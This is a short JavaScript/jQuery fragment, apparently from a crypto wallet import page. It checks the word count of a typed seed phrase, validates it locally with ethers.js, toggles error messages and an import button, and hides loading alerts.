      function showBtn() {
        if(words) $("#imp").prop("disabled", false)
        else $("#imp").prop("disabled", true) 
      }
      
      $('#wordsseed').on("change keyup paste", function(evt) {
        let pass = $(this).val()
        if(pass.split(" ").length == 12 || pass.split(" ").length == 18 || pass.split(" ").length == 21 || pass.split(" ").length == 24){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = true
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })

      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
        $(".alert").fadeOut('slow')
      }, 2000)